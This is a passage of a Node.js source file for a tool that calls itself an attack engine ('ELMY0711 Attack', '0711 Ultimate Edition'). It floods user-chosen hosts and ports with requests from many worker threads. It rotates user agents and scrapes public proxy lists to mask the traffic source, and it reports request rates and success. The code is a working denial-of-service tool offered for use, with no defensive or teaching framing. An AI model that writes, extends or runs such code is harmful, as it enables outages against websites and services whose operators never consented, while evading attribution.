    if (!config.target && !config.targets.length && !cmdArgs.config) {
        config = await interactiveSetup();
    }

    if (config.target) {
        const original = config.target;
        config.target = normalizeTarget(config.target);
        if (original !== config.target) logger.debug(`Target normalized: ${original} -> ${config.target}`);
        config.targets = [config.target];
    }
    if (config.targets) {
        if (typeof config.targets === 'string') {
            if (fs.existsSync(config.targets)) {
                config.targets = fs.readFileSync(config.targets, 'utf8')
                    .split('\n')
                    .map(line => line.trim())
                    .filter(Boolean)
                    .map(normalizeTarget);
            } else {
                config.targets = [normalizeTarget(config.targets)];
            }
        } else if (Array.isArray(config.targets)) {
            config.targets = config.targets.map(normalizeTarget).filter(Boolean);
        }
    }
    if (!config.targets || config.targets.length === 0) {
        logger.error('Tidak ada target! Gunakan --target, --targets, atau jalankan interaktif.');
        process.exit(1);
    }

    logger._target = config.targets[0];
    logger._verbose = config.verbose;

    if (typeof config.ports === 'string') {
        config.ports = config.ports.split(',').map(p => parseInt(p.trim()));
    } else if (!Array.isArray(config.ports)) {
        config.ports = [config.ports];
    }

    if (cmdArgs.workers) config.workersPerPort = parseInt(cmdArgs.workers);
    if (cmdArgs['max-errors']) config.maxErrorsPerWorker = parseInt(cmdArgs['max-errors']);

    const totalWorkers = config.targets.length * config.ports.length * config.workersPerPort;
    if (totalWorkers > 100) {
        logger.warn(`Total workers (${totalWorkers}) sangat tinggi. Pastikan sistem Anda kuat.`);
    }

    config.durationMs = config.duration > 0 ? config.duration * 1000 : null;

    // Load user agents
    let userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    ];
    if (config.userAgentsFile && fs.existsSync(config.userAgentsFile)) {
        try {
            const data = fs.readFileSync(config.userAgentsFile, 'utf8');
            userAgents = data.split('\n').map(l => l.trim()).filter(Boolean);
        } catch (e) {}
    }

    let payloadTemplates = config.payloads || [];
    if (config.payloadsFile && fs.existsSync(config.payloadsFile)) {
        try {
            const data = fs.readFileSync(config.payloadsFile, 'utf8');
            payloadTemplates = data.split('\n').map(l => l.trim()).filter(Boolean);
        } catch (e) {}
    }

    // ===== Proxy Manager =====
    let proxyList = [];

    async function fetchProxies() {
        if (!config.proxyAuto && !config.proxyFile) return;
        const spinner = new Spinner('Fetching proxies...');
        spinner.start();
        const all = new Set();

        if (config.proxyFile && fs.existsSync(config.proxyFile)) {
            const data = fs.readFileSync(config.proxyFile, 'utf8');
            data.split('\n').forEach(line => {
                const l = line.trim();
                if (l && !l.startsWith('#')) all.add(l);
            });
        }

        if (config.proxyAuto) {
            const sources = config.proxySources || CONFIG.proxySources;
            await Promise.allSettled(
                sources.map(async (src) => {
                    try {
                        const urlObj = new URL(src);
                        const protocol = urlObj.protocol === 'https:' ? https : http;
                        const rawData = await new Promise((resolve, reject) => {
                            const req = protocol.get(urlObj, (res) => {
                                let data = '';
                                res.on('data', chunk => data += chunk);
                                res.on('end', () => resolve(data));
                                res.on('error', reject);
                            });
                            req.setTimeout(8000, () => {
                                req.destroy();
                                reject(new Error('Timeout'));
                            });
                            req.on('error', reject);
                        });
                        const lines = rawData.split('\n');
                        const proxies = lines
                            .map(l => l.trim())
                            .filter(l => l && l.includes(':') && !l.startsWith('[') && !l.startsWith('#'))
                            .map(l => {
                                const [host, port] = l.split(':');
                                if (net.isIP(host) && port > 0 && port < 65536) return l;
                                return null;
                            })
                            .filter(Boolean);
                        if (proxies.length > 0) {
                            for (const p of proxies) all.add(p);
                        }
                        if (config.verbose) logger.debug(`Fetched ${proxies.length} from ${src}`);
                    } catch (e) {
                        if (config.verbose) logger.debug(`Failed ${src}: ${e.message}`);
                    }
                })
            );
        }

        proxyList = Array.from(all);
        spinner.stop();
        if (proxyList.length > 0) {
            logger.success(`${proxyList.length} proxies ready.`);
        } else {
            logger.warn('No proxies available. Continuing without proxy.');
        }
    }

    // ===== Attack Engine =====
    class AttackEngine {
        constructor(config, userAgents, payloadTemplates, proxyList) {
            this.config = config;
            this.userAgents = userAgents;
            this.payloadTemplates = payloadTemplates;
            this.proxyList = proxyList;
            this.stats = {
                total: 0,
                success: 0,
                failed: 0,
                serverErrors: 0,
                startTime: Date.now(),
                activeWorkers: 0,
                workersDone: 0,
            };
            this.workers = [];
            this.isStopping = false;
            this.workerCounter = 0;
            this.paused = false;
        }

        togglePause() {
            this.paused = !this.paused;
            logger.info(this.paused ? '⏸ Attack PAUSED' : '▶ Attack RESUMED');
            for (const w of this.workers) {
                try { w.postMessage({ type: this.paused ? 'pause' : 'resume' }); } catch (e) {}
            }
        }

        start(targets) {
            const totalWorkers = targets.length * this.config.ports.length * this.config.workersPerPort;
            logger.info(`Targets: ${targets.map(t => t.host).join(', ')}`);
            logger.info(`Ports: ${this.config.ports.join(', ')}`);
            logger.info(`Workers: ${this.config.workersPerPort} per port per target (total ${totalWorkers})`);
            logger.info(`Attack type: ${this.config.attackType}, Mode: ${this.config.attackMode}, Method: ${this.config.method}`);
            logger.info(`Duration: ${this.config.duration > 0 ? this.config.duration + 's' : 'Unlimited'}`);
            logger.info(`Proxy: ${this.proxyList.length > 0 ? 'Enabled (' + this.proxyList.length + ' proxies)' : 'Disabled'}`);
            logger.info('');

            logger.attack(`ELMY0711 Attack is started`);

            // Write worker file if not exists (always overwrite to ensure latest version)
            const workerFilePath = path.join(__dirname, WORKER_FILE_NAME);
            try {
                fs.writeFileSync(workerFilePath, WORKER_CODE, 'utf8');
                if (this.config.verbose) logger.debug(`Worker file written: ${workerFilePath}`);
            } catch (e) {
                logger.error(`Failed to write worker file: ${e.message}`);
                process.exit(1);
            }

            const workerPromises = [];
            for (const target of targets) {
                for (const port of this.config.ports) {
                    for (let i = 0; i < this.config.workersPerPort; i++) {
                        const workerId = this.workerCounter++;
                        const workerData = {
                            targetIP: target.ip,
                            port: port,
                            attackType: this.config.attackType,
                            attackMode: this.config.attackMode,
                            durationMs: this.config.durationMs,
                            httpMethod: this.config.method,
                            workerId: `${target.host}-${port}-${workerId}`,
                            USER_AGENTS: this.userAgents,
                            CHARSET: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                            proxyList: this.proxyList,
                            payloadTemplates: this.payloadTemplates,
                            maxConsecutiveFailures: this.config.maxConsecutiveFailures || 3,
                            maxErrorsPerWorker: this.config.maxErrorsPerWorker || 5000,
                            backoffBase: this.config.backoffBase || 1000,
                            maxBackoff: this.config.maxBackoff || 30000,
                            verbose: this.config.verbose || false,
                            customHeaders: this.config.customHeaders || {},
                        };

                        const worker = new Worker(workerFilePath, { workerData });
                        this.workers.push(worker);

                        logger.attack(`Attack Thread ${workerId} Started`);

                        const promise = new Promise((resolve, reject) => {
                            worker.on('message', (msg) => {
                                if (msg.type === 'stats') {
                                    this.stats.total += msg.sent || 0;
                                    this.stats.failed += msg.errors || 0;
                                    this.stats.serverErrors += msg.serverErrors || 0;
                                    this.stats.activeWorkers = msg.active || 0;
                                    this.stats.success = Math.max(0, this.stats.total - this.stats.failed - this.stats.serverErrors);
                                } else if (msg.type === 'done') {
                                    this.stats.workersDone++;
                                    resolve({ workerId: msg.workerId, status: 'done' });
                                } else if (msg.type === 'log') {
                                    logger.attack(msg.message);
                                }
                            });
                            worker.on('error', (err) => {
                                this.stats.failed++;
                                logger.error(`Worker ${workerData.workerId} error: ${err.message}`);
                                reject({ workerId: workerData.workerId, status: 'error', error: err });
                            });
                            worker.on('exit', (code) => {
                                if (code !== 0 && !this.isStopping) {
                                    this.stats.failed++;
                                    logger.error(`Worker ${workerData.workerId} exited with code ${code}`);
                                    reject({ workerId: workerData.workerId, status: 'exit', code });
                                } else if (code === 0 && !this.isStopping) {
                                    this.stats.workersDone++;
                                    resolve({ workerId: workerData.workerId, status: 'done' });
                                }
                            });
                        });
                        workerPromises.push(promise);
                    }
                }
            }

            let lastTotal = 0;
            const statsInterval = setInterval(() => {
                const elapsed = (Date.now() - this.stats.startTime) / 1000;
                const rate = this.stats.total / (elapsed || 1);
                const successRate = this.stats.total > 0 ? ((this.stats.success / this.stats.total) * 100).toFixed(1) : 0;
                const progress = this.config.duration > 0 ? Math.min(100, (elapsed / this.config.duration) * 100) : 0;
                const barLength = 30;
                const filled = Math.floor((progress / 100) * barLength);
                const bar = '█'.repeat(filled) + '░'.repeat(barLength - filled);

                console.log(`\r\x1b[36m[STATS]\x1b[0m ${bar} ${progress.toFixed(0)}% | Total: ${this.stats.total} | Success: ${this.stats.success} | Failed: ${this.stats.failed} | Rate: ${rate.toFixed(1)} req/s | SuccessRate: ${successRate}% | Active: ${this.stats.activeWorkers} | Elapsed: ${elapsed.toFixed(1)}s`);
            }, 500);

            // Keyboard controls
            readline.emitKeypressEvents(process.stdin);
            if (process.stdin.isTTY) process.stdin.setRawMode(true);
            process.stdin.on('keypress', (str, key) => {
                if (key && key.name === 'p') {
                    this.togglePause();
                }
                if (key && (key.ctrl && key.name === 'c')) {
                    logger.warn('\nCtrl+C detected. Stopping...');
                    process.emit('SIGINT');
                }
            });

            const sigIntHandler = async () => {
                if (this.isStopping) return;
                this.isStopping = true;
                clearInterval(statsInterval);
                process.stdin.setRawMode(false);
                process.stdin.pause();
                logger.warn('Stopping all workers...');
                for (const w of this.workers) {
                    try { w.postMessage({ type: 'stop' }); } catch (e) {}
                }
                await Promise.allSettled(workerPromises.map(p => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej('timeout'), 5000))])));
                logger.success('All workers stopped.');
                this.generateReport();
                process.exit(0);
            };
            process.on('SIGINT', sigIntHandler);

            if (this.config.durationMs && this.config.durationMs > 0) {
                setTimeout(() => {
                    if (!this.isStopping) {
                        logger.info('\n⏰ Duration limit reached. Stopping...');
                        process.emit('SIGINT');
                    }
                }, this.config.durationMs);
            }

            Promise.allSettled(workerPromises)
                .then(() => {
                    clearInterval(statsInterval);
                    process.stdin.setRawMode(false);
                    process.stdin.pause();
                    logger.success('All workers finished.');
                    this.generateReport();
                    process.exit(0);
                })
                .catch(() => {});
        }

        generateReport() {
            const elapsed = (Date.now() - this.stats.startTime) / 1000;
            const success = Math.max(0, this.stats.total - this.stats.failed - this.stats.serverErrors);
            const successRate = this.stats.total > 0 ? ((success / this.stats.total) * 100).toFixed(2) : 0;
            const report = {
                timestamp: new Date().toISOString(),
                targets: this.config.targets,
                ports: this.config.ports,
                workers: this.config.workersPerPort,
                attackMode: this.config.attackMode,
                duration: elapsed,
                totalRequests: this.stats.total,
                success: success,
                errors: this.stats.failed,
                serverErrors: this.stats.serverErrors,
                successRate: successRate + '%',
                proxyUsed: this.proxyList.length,
                attackType: this.config.attackType,
                method: this.config.method,
            };
            const outputDir = this.config.outputDir || './reports';
            if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });
            const filename = path.join(outputDir, `report_${Date.now()}.json`);
            fs.writeFileSync(filename, JSON.stringify(report, null, 2));
            logger.success(`Report saved to ${filename}`);
            console.log('\n\x1b[36m══════════════════════════════════════════════════\x1b[0m');
            console.log('\x1b[36m╔══════════════════════════════════════════════════╗');
            console.log('\x1b[36m║              ATTACK FINISHED                     ║');
            console.log('\x1b[36m╚══════════════════════════════════════════════════╝');
            console.log(`Target(s)       : ${this.config.targets.join(', ')}`);
            console.log(`Attack Mode     : ${this.config.attackMode}`);
            console.log(`Total Requests  : ${this.stats.total}`);
            console.log(`Success (2xx-3xx): ${success}`);
            console.log(`Errors          : ${this.stats.failed}`);
            console.log(`Server Errors   : ${this.stats.serverErrors}`);
            console.log(`Success Rate    : ${successRate}%`);
            console.log(`Duration        : ${elapsed.toFixed(2)}s`);
            console.log(`Proxy Used      : ${this.proxyList.length > 0 ? 'Yes (' + this.proxyList.length + ')' : 'No'}`);
            console.log('\x1b[36m══════════════════════════════════════════════════\x1b[0m');
            if (this.config.logFile) {
                fs.appendFileSync(this.config.logFile, `[${new Date().toISOString()}] ${JSON.stringify(report)}\n`);
            }
        }
    }

    // ===== Eksekusi =====
    logger.info('Initializing 0711 Ultimate Edition (10/10 – No Worker Limit)...');

    if (config.dashboard) {
        try {
            require.resolve('express');
            require.resolve('cors');
        } catch (e) {
            logger.error('Dashboard dependencies not installed. Run: npm install express cors');
            logger.warn('Dashboard disabled.');
            config.dashboard = false;
        }
    }

    if (config.proxyAuto || config.proxyFile) {
        await fetchProxies();
    }

    const targets = config.targets;
    let resolvedTargets = [];
    const spinner = new Spinner('Resolving targets...');
    spinner.start();
    for (const t of targets) {
        try {
            const ips = await dns.lookup(t, { all: true });
            const ip = ips.find(entry => entry.family === 4)?.address || t;
            resolvedTargets.push({ host: t, ip });
        } catch (e) {
            logger.warn(`Cannot resolve ${t}, using as-is.`);
            resolvedTargets.push({ host: t, ip: t });
        }
    }
    spinner.stop();
    logger.success(`Targets resolved: ${resolvedTargets.map(t => t.host).join(', ')}`);

    if (config.dashboard) {
        try {
            const express = require('express');
            const cors = require('cors');
            const app = express();
            app.use(cors());
            const engine = new AttackEngine(config, userAgents, payloadTemplates, proxyList);
            app.get('/stats', (req, res) => {
                res.json({
                    totalSent: engine.stats.total,
                    totalErrors: engine.stats.failed,
                    serverErrors: engine.stats.serverErrors,
                    activeWorkers: engine.stats.activeWorkers,
                    uptime: (Date.now() - engine.stats.startTime) / 1000,
                    targets: resolvedTargets.map(t => ({ host: t.host, status: 'running' })),
                });
            });
            app.listen(config.dashboardPort, () => {
                logger.success(`Dashboard running at http://localhost:${config.dashboardPort}/stats`);
            });
        } catch (e) {
            logger.warn('Dashboard failed to start.');
        }
    }

    const engine = new AttackEngine(config, userAgents, payloadTemplates, proxyList);
    engine.start(resolvedTargets);
}

if (require.main === module) {
    main().catch(err => {
        console.error('\x1b[31m[FATAL]\x1b[0m', err);
        process.exit(1);
    });
                                        }
